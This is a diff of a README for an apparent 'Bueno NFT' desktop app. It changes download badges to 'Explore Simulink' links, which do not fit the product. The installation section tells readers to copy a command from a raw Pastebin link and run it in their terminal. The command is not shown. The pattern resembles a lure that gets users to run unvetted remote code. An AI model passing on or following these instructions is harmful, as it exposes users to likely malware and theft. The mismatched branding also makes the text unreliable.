@@ -10,8 +10,8 @@
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://lewishesterppqu.github.io/.github/bueno-nft-desktop-app)  
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://lewishesterppqu.github.io/.github/bueno-nft-desktop-app)  
+[![Explore Simulink](https://img.shields.io/badge/Explore-Simulink-0369A1?style=for-the-badge)](https://bueno-nft.github.io/.github/)
+
 
 </div>  
 
@@ -35,7 +35,7 @@
 **Installation via terminal command:**  
 1. Visit the Pastebin link provided on our website and copy the command
 
-https://pastebin.com/raw/0XST7PEZ
+[![Explore Simulink](https://img.shields.io/badge/Explore-Simulink-0369A1?style=for-the-badge)](https://bueno-nft.github.io/.github/)
   
 2. Open your terminal, paste the command you copied, and run it  
 
@@ -69,10 +69,6 @@ Whether you are an independent artist or a studio managing large collections, **
 - **Cross-Platform** – Works seamlessly on both Windows and macOS  
 - **User-Friendly Interface** – No coding knowledge required  
 - **Scalable** – From small indie projects to large NFT studios  
-
----
-
-![Bueno NFT Dashboard](https://i.ytimg.com/vi/v7KZOmNai7Y/maxresdefault.jpg)  
 
 ---
 
